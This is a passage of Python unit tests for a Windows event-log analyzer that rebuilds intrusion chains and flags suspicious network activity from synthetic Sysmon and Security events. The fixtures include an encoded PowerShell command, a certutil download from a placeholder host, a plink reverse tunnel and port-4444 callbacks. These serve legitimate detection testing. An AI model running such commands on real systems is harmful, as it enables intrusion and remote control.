from __future__ import annotations

from datetime import datetime, timedelta, timezone
import io
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from cat_app import analyzer
from cat_app.analyzer import analyze_events
from cat_app.evtx_reader import parse_event_files
from cat_app.models import EventRecord, ParseResult
from cat_app.reporting import generate_rule_report


SYSMON_PROVIDER = "Microsoft-Windows-Sysmon"
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
SECURITY_PROVIDER = "Microsoft-Windows-Security-Auditing"


class NetworkAnalysisTests(unittest.TestCase):
    def test_streaming_xml_parser_builds_process_dns_network_intrusion_chain(self) -> None:
        root_guid = "{81818181-1111-2222-3333-444444444444}"
        child_guid = "{82828282-1111-2222-3333-444444444444}"

        def xml_event(
            record_id: int,
            event_id: int,
            timestamp: str,
            fields: dict[str, str],
        ) -> str:
            data = "".join(
                f'<Data Name="{key}">{value}</Data>'
                for key, value in fields.items()
            )
            return f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="{SYSMON_PROVIDER}"/>
    <EventID>{event_id}</EventID>
    <TimeCreated SystemTime="{timestamp}"/>
    <EventRecordID>{record_id}</EventRecordID>
    <Channel>{SYSMON_CHANNEL}</Channel>
    <Computer>HOST-XML</Computer>
  </System>
  <EventData>{data}</EventData>
</Event>"""

        content = "<Events>" + "".join(
            [
                xml_event(
                    1,
                    1,
                    "2026-01-06T00:00:00Z",
                    {
                        "ProcessGuid": root_guid,
                        "ProcessId": "810",
                        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                        "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
                        "ParentImage": r"C:\Windows\explorer.exe",
                        "ParentProcessId": "100",
                    },
                ),
                xml_event(
                    2,
                    1,
                    "2026-01-06T00:00:02Z",
                    {
                        "ProcessGuid": child_guid,
                        "ProcessId": "820",
                        "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                        "ParentProcessGuid": root_guid,
                        "ParentProcessId": "810",
                        "ParentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    },
                ),
                xml_event(
                    3,
                    22,
                    "2026-01-06T00:00:04Z",
                    {
                        "ProcessGuid": child_guid,
                        "ProcessId": "820",
                        "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                        "QueryName": "control.example.test",
                        "QueryResults": "8.8.8.8",
                    },
                ),
                xml_event(
                    4,
                    3,
                    "2026-01-06T00:00:05Z",
                    {
                        "ProcessGuid": child_guid,
                        "ProcessId": "820",
                        "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                        "Initiated": "true",
                        "Protocol": "tcp",
                        "SourceIp": "10.0.0.5",
                        "SourcePort": "50123",
                        "DestinationIp": "8.8.8.8",
                        "DestinationPort": "4444",
                    },
                ),
            ]
        ) + "</Events>"

        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "sysmon-chain.xml"
            path.write_text(content, encoding="utf-8")
            parsed = parse_event_files([path], None, None, max_records=2)
            try:
                analysis = analyze_events(parsed, None, None)
            finally:
                parsed.close()

        chain = analysis["intrusion_chain"]
        self.assertTrue(analysis["scope"]["record_limit_reached"])
        self.assertTrue(chain["source"]["spool_scan_used"])
        self.assertTrue(chain["source"]["source_scan_complete"])
        self.assertEqual(chain["origin_process"]["process_guid"], root_guid.casefold())
        child = next(
            item
            for item in chain["processes"]
            if item["process_guid"] == child_guid.casefold()
        )
        self.assertIn("ParentProcessGuid", child["parent_link_basis"])
        step_kinds = [step["event_kind"] for step in chain["steps"]]
        self.assertIn("origin_process_candidate", step_kinds)
        self.assertIn("suspicious_child_process", step_kinds)
        self.assertIn("dns_query", step_kinds)
        self.assertIn("network_connection", step_kinds)
        self.assertTrue(
            any(
                step.get("query_name") == "control.example.test"
                for step in chain["steps"]
            )
        )
        self.assertTrue(
            any(
                step.get("destination_ip") == "8.8.8.8"
                and step.get("destination_port") == 4444
                for step in chain["steps"]
            )
        )

    def test_intrusion_chain_starts_at_earliest_suspicious_process_and_follows_child(self) -> None:
        start = datetime(2026, 1, 1, tzinfo=timezone.utc)
        root_guid = "{10101010-1111-2222-3333-444444444444}"
        child_guid = "{20202020-1111-2222-3333-444444444444}"
        events = [
            _event(
                "1",
                start,
                record_id="1",
                data={
                    "ProcessGuid": root_guid,
                    "ProcessId": "100",
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
                    "ParentImage": r"C:\Windows\explorer.exe",
                    "ParentProcessId": "50",
                },
            ),
            _event(
                "1",
                start + timedelta(seconds=2),
                record_id="2",
                data={
                    "ProcessGuid": child_guid,
                    "ProcessId": "200",
                    "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                    "ParentProcessGuid": root_guid,
                    "ParentProcessId": "100",
                },
            ),
            _event(
                "22",
                start + timedelta(seconds=4),
                record_id="3",
                data={
                    "ProcessGuid": child_guid,
                    "ProcessId": "200",
                    "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                    "QueryName": "control.example.test",
                    "QueryResults": "8.8.8.8",
                },
            ),
            _event(
                "3",
                start + timedelta(seconds=5),
                record_id="4",
                data={
                    "ProcessGuid": child_guid,
                    "ProcessId": "200",
                    "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                    "Initiated": "true",
                    "Protocol": "tcp",
                    "DestinationIp": "8.8.8.8",
                    "DestinationPort": "4444",
                },
            ),
        ]

        analysis = analyze_events(_result(events), None, None)

        chain = analysis["intrusion_chain"]
        self.assertEqual(chain["status"], "origin_process_candidate_identified")
        self.assertTrue(chain["candidate_only"])
        self.assertFalse(chain["origin_process"]["confirmed"])
        self.assertEqual(chain["origin_process"]["process_guid"], root_guid.casefold())
        self.assertIn("악성 여부", chain["confidence_scope"])
        processes = {item["process_guid"]: item for item in chain["processes"]}
        self.assertEqual(
            processes[child_guid.casefold()]["parent_process_instance_id"],
            processes[root_guid.casefold()]["process_instance_id"],
        )
        self.assertIn(
            "ParentProcessGuid",
            processes[child_guid.casefold()]["parent_link_basis"],
        )
        step_kinds = {item["event_kind"] for item in chain["steps"]}
        self.assertIn("origin_process_candidate", step_kinds)
        self.assertIn("dns_query", step_kinds)
        self.assertIn("network_connection", step_kinds)
        self.assertEqual(
            [item["time"] for item in chain["steps"]],
            sorted(item["time"] for item in chain["steps"]),
        )
        known_refs = {item["event_ref"] for item in analysis["suspicious_events"]}
        self.assertTrue(set(chain["evidence_refs"]).issubset(known_refs))
        report, _ = generate_rule_report(analysis)
        self.assertIn("최초 침해 시작 프로세스 후보와 후속 흐름", report)
        self.assertIn("powershell.exe", report.casefold())
        self.assertIn("control.example.test", report)

    def test_intrusion_chain_keeps_normal_parent_as_context_not_origin(self) -> None:
        start = datetime(2026, 1, 2, tzinfo=timezone.utc)
        parent_guid = "{30303030-1111-2222-3333-444444444444}"
        child_guid = "{40404040-1111-2222-3333-444444444444}"
        parent = _event(
            "1",
            start,
            record_id="1",
            data={
                "ProcessGuid": parent_guid,
                "ProcessId": "300",
                "Image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                "CommandLine": "WINWORD.EXE document.docx",
            },
        )
        child = _event(
            "1",
            start + timedelta(seconds=3),
            record_id="2",
            data={
                "ProcessGuid": child_guid,
                "ProcessId": "301",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
                "ParentProcessGuid": parent_guid,
                "ParentProcessId": "300",
                "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            },
        )

        chain = analyze_events(_result([parent, child]), None, None)["intrusion_chain"]

        self.assertEqual(chain["origin_process"]["process_guid"], child_guid.casefold())
        parent_context = chain["origin_process"]["parent_context"]
        self.assertEqual(parent_context["process_guid"], parent_guid.casefold())
        self.assertFalse(parent_context["maliciousness_assessed"])
        self.assertIn("악성", parent_context["note"])

    def test_intrusion_chain_reads_process_lineage_beyond_retained_records_from_spool(self) -> None:
        start = datetime(2026, 1, 3, tzinfo=timezone.utc)
        root_guid = "{50505050-1111-2222-3333-444444444444}"
        child_guid = "{60606060-1111-2222-3333-444444444444}"
        spooled_events = [
            _event(
                "1",
                start,
                record_id="1001",
                data={
                    "ProcessGuid": root_guid,
                    "ProcessId": "500",
                    "Image": r"C:\Windows\System32\cmd.exe",
                    "CommandLine": "cmd.exe /c certutil -urlcache http://example.test/a",
                },
            ),
            _event(
                "1",
                start + timedelta(seconds=2),
                record_id="1002",
                data={
                    "ProcessGuid": child_guid,
                    "ProcessId": "501",
                    "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                    "ParentProcessGuid": root_guid,
                    "ParentProcessId": "500",
                },
            ),
            _event(
                "22",
                start + timedelta(seconds=3),
                record_id="1003",
                data={
                    "ProcessGuid": child_guid,
                    "ProcessId": "501",
                    "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                    "QueryName": "control.example.test",
                    "QueryResults": "1.1.1.1",
                },
            ),
            _event(
                "3",
                start + timedelta(seconds=4),
                record_id="1004",
                data={
                    "ProcessGuid": child_guid,
                    "ProcessId": "501",
                    "Image": r"C:\Users\alice\AppData\Local\Temp\agent.exe",
                    "Initiated": "true",
                    "DestinationIp": "1.1.1.1",
                    "DestinationPort": "4444",
                },
            ),
        ]
        spool = io.StringIO(
            "".join(
                json.dumps(event.to_dict(), ensure_ascii=False) + "\n"
                for event in spooled_events
            )
        )
        parse_result = ParseResult(
            records=[],
            files=[],
            errors=[],
            total_seen=2000,
            total_in_range=2000,
            record_limit_reached=True,
            network_records_seen=4,
            network_records_spooled=4,
            _network_record_spool=spool,
        )
        try:
            chain = analyze_events(parse_result, None, None)["intrusion_chain"]
        finally:
            parse_result.close()

        self.assertEqual(chain["origin_process"]["process_guid"], root_guid.casefold())
        self.assertTrue(chain["source"]["spool_scan_used"])
        self.assertTrue(chain["source"]["source_scan_complete"])
        self.assertEqual(chain["source"]["retained_record_count"], 0)
        self.assertEqual(chain["source"]["process_record_count"], 2)
        self.assertFalse(chain["truncated"])

    def test_intrusion_chain_marks_bounded_process_graph_as_truncated(self) -> None:
        start = datetime(2026, 1, 4, tzinfo=timezone.utc)
        events = [
            _event(
                "1",
                start + timedelta(seconds=index),
                record_id=str(index),
                data={
                    "ProcessGuid": f"{{70707070-1111-2222-3333-{index:012d}}}",
                    "ProcessId": str(700 + index),
                    "Image": r"C:\Windows\System32\notepad.exe",
                    "CommandLine": (
                        "powershell.exe -EncodedCommand SQBFAFgA"
                        if index == 3
                        else "notepad.exe"
                    ),
                },
            )
            for index in range(4)
        ]

        with patch.object(analyzer, "INTRUSION_PROCESS_NODE_LIMIT", 2), patch.object(
            analyzer,
            "INTRUSION_PRIORITY_PROCESS_NODE_LIMIT",
            1,
        ):
            chain = analyze_events(_result(events), None, None)["intrusion_chain"]

        self.assertEqual(chain["status"], "origin_process_candidate_identified")
        self.assertTrue(chain["truncated"])
        self.assertTrue(chain["chain_truncated"])
        self.assertTrue(chain["source"]["process_node_limit_reached"])
        self.assertTrue(any("프로세스 그래프" in item for item in chain["limitations"]))

    def test_intrusion_chain_pid_parent_fallback_is_labeled_low_confidence(self) -> None:
        start = datetime(2026, 1, 5, tzinfo=timezone.utc)
        parent = _event(
            "1",
            start,
            record_id="1",
            data={
                "ProcessId": "800",
                "Image": r"C:\Windows\System32\cmd.exe",
                "CommandLine": "cmd.exe /c certutil -urlcache http://example.test/a",
            },
        )
        child = _event(
            "1",
            start + timedelta(minutes=2),
            record_id="2",
            data={
                "ProcessId": "801",
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
                "ParentProcessId": "800",
                "ParentImage": r"C:\Windows\System32\cmd.exe",
            },
        )

        chain = analyze_events(_result([parent, child]), None, None)["intrusion_chain"]

        self.assertEqual(chain["origin_process"]["process_id"], "800")
        self.assertEqual(chain["confidence"], "low")
        child_process = next(
            item for item in chain["processes"] if item["process_id"] == "801"
        )
        self.assertIn("ProcessGuid 부재", child_process["parent_link_basis"])
        self.assertTrue(any("PID 재사용" in item for item in chain["limitations"]))

    def test_security_4688_new_pid_links_parent_chain_and_5156_connection(self) -> None:
        start = datetime(2026, 1, 5, 1, tzinfo=timezone.utc)
        parent = _event(
            "4688",
            start,
            record_id="10",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "NewProcessId": "0x100",
                "NewProcessName": r"C:\Windows\System32\cmd.exe",
                "ProcessId": "0x50",
                "CreatorProcessName": r"C:\Windows\explorer.exe",
                "CommandLine": "cmd.exe /c certutil -urlcache http://example.test/a",
            },
        )
        child = _event(
            "4688",
            start + timedelta(seconds=2),
            record_id="11",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "NewProcessId": "0x200",
                "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "ProcessId": "0x100",
                "CreatorProcessName": r"C:\Windows\System32\cmd.exe",
                "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
            },
        )
        connection = _event(
            "5156",
            start + timedelta(seconds=4),
            record_id="12",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "ProcessID": "0x200",
                "Application": (
                    r"\device\harddiskvolume3\windows\system32\windowspowershell"
                    r"\v1.0\powershell.exe"
                ),
                "Direction": "%%14593",
                "SourceAddress": "10.0.0.5",
                "SourcePort": "50200",
                "DestAddress": "8.8.8.8",
                "DestPort": "4444",
                "Protocol": "6",
            },
        )

        analysis = analyze_events(_result([parent, child, connection]), None, None)

        process_events = {
            item["record_id"]: item
            for item in analysis["suspicious_events"]
            if item["event_id"] == "4688"
        }
        self.assertEqual(process_events["10"]["process_id"], "256")
        self.assertEqual(process_events["11"]["process_id"], "512")
        network_finding = _finding(analysis, "suspicious_network_connection")
        self.assertTrue(
            any(
                "동일 호스트·PID" in reason
                for reason in network_finding["network_context"]["correlation_reasons"]
            )
        )
        self.assertEqual(
            network_finding["network_context"]["process_id"],
            "512",
        )
        chain = analysis["intrusion_chain"]
        self.assertEqual(chain["origin_process"]["process_id"], "256")
        child_process = next(
            item for item in chain["processes"] if item["process_id"] == "512"
        )
        self.assertEqual(child_process["parent_process_id"], "256")
        self.assertIn("ProcessGuid 부재", child_process["parent_link_basis"])
        self.assertTrue(
            any(
                step["event_kind"] == "network_connection"
                and step.get("destination_ip") == "8.8.8.8"
                for step in chain["steps"]
            )
        )

    def test_process_dns_and_connection_are_correlated_by_process_guid(self) -> None:
        start = datetime(2026, 1, 2, 3, 4, tzinfo=timezone.utc)
        guid = "{11111111-2222-3333-4444-555555555555}"
        process = _event(
            "1",
            start,
            record_id="1",
            data={
                "ProcessGuid": guid,
                "ProcessId": "4242",
                "Image": r"C:\Users\alice\AppData\Local\Temp\payload.exe",
                "CommandLine": "payload.exe --connect",
                "ParentImage": r"C:\Windows\System32\cmd.exe",
                "ParentCommandLine": "cmd.exe /c payload.exe --connect",
                "Hashes": "SHA256=0123456789abcdef",
                "User": r"LAB\alice",
            },
        )
        dns = _event(
            "22",
            start + timedelta(seconds=10),
            record_id="2",
            data={
                "ProcessGuid": guid,
                "ProcessId": "4242",
                "Image": r"C:\Users\alice\AppData\Local\Temp\payload.exe",
                "QueryName": "control.example.test",
                "QueryResults": "8.8.8.8",
                "User": r"LAB\alice",
            },
        )
        connection = _event(
            "3",
            start + timedelta(seconds=12),
            record_id="3",
            data={
                "ProcessGuid": guid,
                "ProcessId": "4242",
                "Image": r"C:\Users\alice\AppData\Local\Temp\payload.exe",
                "User": r"LAB\alice",
                "Protocol": "tcp",
                "Initiated": "true",
                "SourceIp": "10.0.0.5",
                "SourcePort": "50123",
                "DestinationIp": "8.8.8.8",
                "DestinationHostname": "control.example.test",
                "DestinationPort": "4444",
            },
        )

        analysis = analyze_events(_result([connection, dns, process]), None, None)

        finding = _finding(analysis, "suspicious_network_connection")
        self.assertEqual(
            {item["event_id"] for item in finding["evidence"]},
            {"1", "3", "22"},
        )
        context = finding["network_context"]
        self.assertEqual(context["destination_ip"], "8.8.8.8")
        self.assertEqual(context["destination_port"], 4444)
        self.assertEqual(context["dns_queries"], ["control.example.test"])
        self.assertTrue(any("ProcessGuid" in value for value in context["correlation_reasons"]))
        process_evidence = next(
            item for item in finding["evidence"] if item["event_id"] == "1"
        )
        self.assertEqual(
            process_evidence["fields"]["ParentImage"],
            r"C:\Windows\System32\cmd.exe",
        )
        self.assertEqual(
            process_evidence["fields"]["Hashes"],
            "SHA256=0123456789abcdef",
        )

        network_event = next(
            item
            for item in analysis["suspicious_events"]
            if item["event_id"] == "3"
        )
        self.assertEqual(network_event["source_ip"], "10.0.0.5")
        self.assertEqual(network_event["source_port"], 50123)
        self.assertEqual(network_event["destination_ip"], "8.8.8.8")
        self.assertEqual(network_event["destination_port"], 4444)
        self.assertEqual(network_event["destination_hostname"], "control.example.test")
        self.assertEqual(network_event["protocol"], "tcp")
        self.assertIs(network_event["initiated"], True)
        self.assertEqual(network_event["network_direction"], "outbound")
        self.assertEqual(network_event["process_guid"], guid.casefold())
        self.assertEqual(network_event["fields"]["DestinationIp"], "8.8.8.8")

        dns_event = next(
            item
            for item in analysis["suspicious_events"]
            if item["event_id"] == "22"
        )
        self.assertEqual(dns_event["query_name"], "control.example.test")
        self.assertEqual(dns_event["fields"]["QueryResults"], "8.8.8.8")

        report, status = generate_rule_report(analysis)
        self.assertEqual(status["backend"], "rule")
        self.assertIn("dst=control.example.test (8.8.8.8):4444", report)
        self.assertIn(f"ProcessGuid={guid.casefold()}", report)
        self.assertIn("### 상위 목적지 IP", report)

    def test_sysmon_provider_and_channel_must_match_exactly(self) -> None:
        time = datetime(2026, 1, 1, tzinfo=timezone.utc)
        collisions = [
            _event(
                "3",
                time,
                provider="Collision-Sysmon",
                data={"DestinationIp": "8.8.8.8", "DestinationPort": "4444"},
            ),
            _event(
                "3",
                time,
                channel="Application",
                data={"DestinationIp": "8.8.8.8", "DestinationPort": "4444"},
            ),
            _event(
                "22",
                time,
                provider="Collision-Sysmon",
                data={"QueryName": "bad.example"},
            ),
        ]

        analysis = analyze_events(_result(collisions), None, None)

        self.assertEqual(analysis["network_activity"]["connection_event_count"], 0)
        self.assertEqual(analysis["network_activity"]["dns_query_event_count"], 0)
        self.assertFalse(
            any(
                str(item["rule_id"]).startswith(("suspicious_network", "possible_network"))
                for item in analysis["findings"]
            )
        )

    def test_pid_fallback_requires_same_host_image_and_tight_time_window(self) -> None:
        start = datetime(2026, 2, 3, tzinfo=timezone.utc)
        unrelated_process = _event(
            "1",
            start,
            record_id="1",
            host="HOST-A",
            data={
                "ProcessId": "31337",
                "Image": r"C:\Users\alice\AppData\Local\Temp\unrelated.exe",
            },
        )
        connection = _event(
            "3",
            start + timedelta(minutes=2),
            record_id="2",
            host="HOST-A",
            data={
                "ProcessId": "31337",
                "Image": r"C:\Windows\System32\svchost.exe",
                "Initiated": "true",
                "DestinationIp": "1.1.1.1",
                "DestinationPort": "4444",
            },
        )

        analysis = analyze_events(_result([unrelated_process, connection]), None, None)

        finding = _finding(analysis, "suspicious_network_connection")
        evidence_ids = [item["event_id"] for item in finding["evidence"]]
        self.assertEqual(evidence_ids, ["3"])
        self.assertFalse(
            any("PID" in value for value in finding["network_context"]["correlation_reasons"])
        )

    def test_pid_fallback_correlates_matching_image(self) -> None:
        start = datetime(2026, 2, 3, tzinfo=timezone.utc)
        process = _event(
            "1",
            start,
            record_id="1",
            data={
                "ProcessId": "31337",
                "Image": r"C:\Users\alice\Downloads\agent.exe",
            },
        )
        connection = _event(
            "3",
            start + timedelta(minutes=2),
            record_id="2",
            data={
                "ProcessId": "31337",
                "Image": r"C:\Users\alice\Downloads\agent.exe",
                "Initiated": "true",
                "DestinationIp": "1.1.1.1",
                "DestinationPort": "443",
            },
        )

        analysis = analyze_events(_result([process, connection]), None, None)

        finding = _finding(analysis, "suspicious_network_connection")
        self.assertEqual(
            {item["event_id"] for item in finding["evidence"]},
            {"1", "3"},
        )
        self.assertTrue(
            any("PID" in value for value in finding["network_context"]["correlation_reasons"])
        )

    def test_regular_connections_create_possible_beacon_finding(self) -> None:
        start = datetime(2026, 3, 4, tzinfo=timezone.utc)
        events = [
            _event(
                "3",
                start + timedelta(seconds=60 * index),
                record_id=str(index + 1),
                data={
                    "ProcessGuid": "{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}",
                    "ProcessId": "777",
                    "Image": r"C:\Windows\System32\svchost.exe",
                    "Initiated": "true",
                    "Protocol": "tcp",
                    "DestinationIp": "8.8.4.4",
                    "DestinationPort": "443",
                },
            )
            for index in range(8)
        ]

        analysis = analyze_events(_result(events), None, None)

        finding = _finding(analysis, "possible_network_beacon")
        self.assertEqual(finding["network_context"]["connection_count"], 8)
        self.assertTrue(finding["network_context"]["possible_beacon"])
        self.assertIn("중앙 간격 60.0초", " ".join(finding["network_context"]["anomaly_signals"]))

    def test_normal_browser_https_does_not_become_finding(self) -> None:
        start = datetime(2026, 4, 5, tzinfo=timezone.utc)
        events = [
            _event(
                "3",
                start + timedelta(seconds=offset),
                record_id=str(index + 1),
                data={
                    "ProcessGuid": "{bbbbbbbb-cccc-dddd-eeee-ffffffffffff}",
                    "ProcessId": "1000",
                    "Image": r"C:\Users\alice\AppData\Local\Google\Chrome\chrome.exe",
                    "Initiated": "true",
                    "Protocol": "tcp",
                    "DestinationIp": "8.8.8.8",
                    "DestinationHostname": "www.example.com",
                    "DestinationPort": "443",
                },
            )
            for index, offset in enumerate((0, 2, 11, 47, 180))
        ]

        analysis = analyze_events(_result(events), None, None)

        self.assertEqual(analysis["findings"], [])
        self.assertEqual(analysis["network_activity"]["external_connection_count"], 5)
        connection = analysis["network_activity"]["connections"][0]
        self.assertFalse(connection["suspicious"])
        self.assertIn("외부/비로컬 목적지", connection["anomaly_signals"])

    def test_security_5156_preserves_network_fields_and_tunnel_process(self) -> None:
        start = datetime(2026, 5, 6, tzinfo=timezone.utc)
        process = _event(
            "4688",
            start,
            record_id="1",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "NewProcessId": "0x1234",
                "NewProcessName": r"C:\Tools\plink.exe",
                "CommandLine": "plink.exe -R 3389:127.0.0.1:3389",
            },
        )
        event = _event(
            "5156",
            start + timedelta(milliseconds=30),
            record_id="2",
            provider=SECURITY_PROVIDER,
            channel="Security",
            data={
                "ProcessID": "0x1234",
                "Application": r"\device\harddiskvolume3\tools\plink.exe",
                "Direction": "%%14593",
                "SourceAddress": "192.168.1.20",
                "SourcePort": "53000",
                "DestAddress": "192.168.1.10",
                "DestPort": "3389",
                "Protocol": "6",
            },
        )

        analysis = analyze_events(_result([process, event]), None, None)

        finding = _finding(analysis, "suspicious_network_connection")
        self.assertIn("터널링 도구", " ".join(finding["network_context"]["anomaly_signals"]))
        self.assertEqual(
            {item["event_id"] for item in finding["evidence"]},
            {"4688", "5156"},
        )
        self.assertTrue(
            any(
                "파일명(경로 표기 상이)" in value
                for value in finding["network_context"]["correlation_reasons"]
            )
        )
        suspicious = next(
            item
            for item in analysis["suspicious_events"]
            if item["event_id"] == "5156"
        )
        self.assertEqual(suspicious["destination_ip"], "192.168.1.10")
        self.assertEqual(suspicious["destination_port"], 3389)
        self.assertEqual(suspicious["source_port"], 53000)
        self.assertEqual(suspicious["protocol"], "tcp")
        self.assertEqual(suspicious["network_direction"], "outbound")
        self.assertEqual(suspicious["process_id"], "4660")

    def test_w3wp_sensitive_loopback_connection_is_tunnel_candidate(self) -> None:
        event = _event(
            "3",
            datetime(2026, 6, 7, tzinfo=timezone.utc),
            data={
                "ProcessGuid": "{12345678-1234-1234-1234-123456789abc}",
                "ProcessId": "9000",
                "Image": r"C:\Windows\System32\inetsrv\w3wp.exe",
                "Initiated": "true",
                "DestinationIp": "127.0.0.1",
                "DestinationPort": "3389",
                "Protocol": "tcp",
            },
        )

        analysis = analyze_events(_result([event]), None, None)

        finding = _finding(analysis, "suspicious_network_connection")
        self.assertTrue(finding["network_context"]["sensitive_loopback"])
        self.assertFalse(finding["network_context"]["external_destination"])

    def test_network_activity_marks_representative_group_limitation(self) -> None:
        start = datetime(2026, 7, 8, tzinfo=timezone.utc)
        events = [
            _event(
                "3",
                start + timedelta(seconds=index),
                record_id=str(index),
                data={
                    "ProcessId": str(1000 + index),
                    "Image": r"C:\Windows\System32\svchost.exe",
                    "Initiated": "true",
                    "DestinationIp": f"8.8.{index // 250}.{index % 250 + 1}",
                    "DestinationPort": "443",
                },
            )
            for index in range(70)
        ]

        analysis = analyze_events(_result(events), None, None)

        activity = analysis["network_activity"]
        self.assertEqual(activity["group_count"], 70)
        self.assertEqual(activity["included_group_count"], 64)
        self.assertTrue(activity["truncated"])
        self.assertIn("대표 64개", activity["limitation"])

    def test_dense_dns_correlation_examines_a_bounded_candidate_set(self) -> None:
        start = datetime(2026, 8, 9, tzinfo=timezone.utc)
        guid = "{cccccccc-dddd-eeee-ffff-000000000001}"
        dns_events = [
            _event(
                "22",
                start + timedelta(seconds=index),
                record_id=f"dns-{index}",
                data={
                    "ProcessGuid": guid,
                    "ProcessId": "2222",
                    "Image": r"C:\Windows\System32\svchost.exe",
                    "QueryName": "same.example",
                },
            )
            for index in range(200)
        ]
        connections = [
            _event(
                "3",
                start + timedelta(seconds=100 + index),
                record_id=f"net-{index}",
                data={
                    "ProcessGuid": guid,
                    "ProcessId": "2222",
                    "Image": r"C:\Windows\System32\svchost.exe",
                    "Initiated": "true",
                    "DestinationIp": "8.8.8.8",
                    "DestinationHostname": "same.example",
                    "DestinationPort": "443",
                },
            )
            for index in range(50)
        ]

        with patch.object(
            analyzer,
            "_event_time_delta_seconds",
            wraps=analyzer._event_time_delta_seconds,
        ) as delta:
            analysis = analyze_events(
                _result([*dns_events, *connections]),
                None,
                None,
            )

        self.assertEqual(analysis["network_activity"]["connection_event_count"], 50)
        self.assertLessEqual(delta.call_count, 50 * 32)

    def test_process_termination_prevents_stale_pid_correlation(self) -> None:
        start = datetime(2026, 9, 10, tzinfo=timezone.utc)
        process = _event(
            "1",
            start,
            record_id="1",
            data={
                "ProcessId": "4242",
                "Image": r"C:\Users\alice\Downloads\old-agent.exe",
                "CommandLine": "old-agent.exe --connect",
            },
        )
        termination = _event(
            "5",
            start + timedelta(seconds=20),
            record_id="2",
            data={
                "ProcessId": "4242",
                "Image": r"C:\Users\alice\Downloads\old-agent.exe",
            },
        )
        connection = _event(
            "3",
            start + timedelta(seconds=40),
            record_id="3",
            data={
                "ProcessId": "4242",
                "Image": r"C:\Users\alice\Downloads\old-agent.exe",
                "Initiated": "true",
                "DestinationIp": "8.8.8.8",
                "DestinationPort": "4444",
            },
        )

        analysis = analyze_events(
            _result([process, termination, connection]), None, None
        )

        finding = _finding(analysis, "suspicious_network_connection")
        self.assertEqual([item["event_id"] for item in finding["evidence"]], ["3"])
        context = finding["network_context"]
        self.assertIsNone(context["process_instance_id"])
        self.assertEqual(
            context["process_end_time"],
            "2026-09-10T00:00:20Z",
        )
        self.assertTrue(
            any("종료" in reason for reason in context["correlation_reasons"])
        )

    def test_same_pid_and_image_reuse_creates_distinct_process_instances(self) -> None:
        start = datetime(2026, 9, 11, tzinfo=timezone.utc)
        image = r"C:\Windows\System32\svchost.exe"
        old_start = _event(
            "1", start, record_id="start-old", data={"ProcessId": "77", "Image": image}
        )
        old_connections = [
            _event(
                "3",
                start + timedelta(seconds=5 * index),
                record_id=f"old-{index}",
                data={
                    "ProcessId": "77",
                    "Image": image,
                    "Initiated": "true",
                    "DestinationIp": "8.8.4.4",
                    "DestinationPort": "443",
                },
            )
            for index in range(1, 4)
        ]
        termination = _event(
            "5",
            start + timedelta(seconds=20),
            record_id="stop-old",
            data={"ProcessId": "77", "Image": image},
        )
        new_start = _event(
            "1",
            start + timedelta(seconds=30),
            record_id="start-new",
            data={"ProcessId": "77", "Image": image},
        )
        new_connections = [
            _event(
                "3",
                start + timedelta(seconds=30 + 5 * index),
                record_id=f"new-{index}",
                data={
                    "ProcessId": "77",
                    "Image": image,
                    "Initiated": "true",
                    "DestinationIp": "8.8.4.4",
                    "DestinationPort": "443",
                },
            )
            for index in range(1, 4)
        ]

        analysis = analyze_events(
            _result(
                [
                    old_start,
                    *old_connections,
                    termination,
                    new_start,
                    *new_connections,
                ]
            ),
            None,
            None,
        )

        groups = analysis["network_activity"]["connections"]
        self.assertEqual(len(groups), 2)
        self.assertEqual({item["connection_count"] for item in groups}, {3})
        self.assertEqual(len({item["process_instance_id"] for item in groups}), 2)
        self.assertFalse(any(item["possible_beacon"] for item in groups))

    def test_terminated_and_reused_process_guid_does_not_merge_lifetimes(self) -> None:
        start = datetime(2026, 9, 11, 1, tzinfo=timezone.utc)
        guid = "{77777777-aaaa-bbbb-cccc-777777777777}"
        image = r"C:\Windows\System32\svchost.exe"
        old_start = _event(
            "1",
            start,
            record_id="start-old-guid",
            data={"ProcessGuid": guid, "ProcessId": "88", "Image": image},
        )
        old_connections = [
            _event(
                "3",
                start + timedelta(seconds=5 * index),
                record_id=f"old-guid-{index}",
                data={
                    "ProcessGuid": guid,
                    "ProcessId": "88",
                    "Image": image,
                    "Initiated": "true",
                    "DestinationIp": "8.8.4.4",
                    "DestinationPort": "443",
                },
            )
            for index in range(1, 4)
        ]
        termination = _event(
            "5",
            start + timedelta(seconds=20),
            record_id="stop-old-guid",
            data={"ProcessGuid": guid, "ProcessId": "88", "Image": image},
        )
        post_termination_connections = [
            _event(
                "3",
                start + timedelta(seconds=20 + 5 * index),
                record_id=f"ended-guid-{index}",
                data={
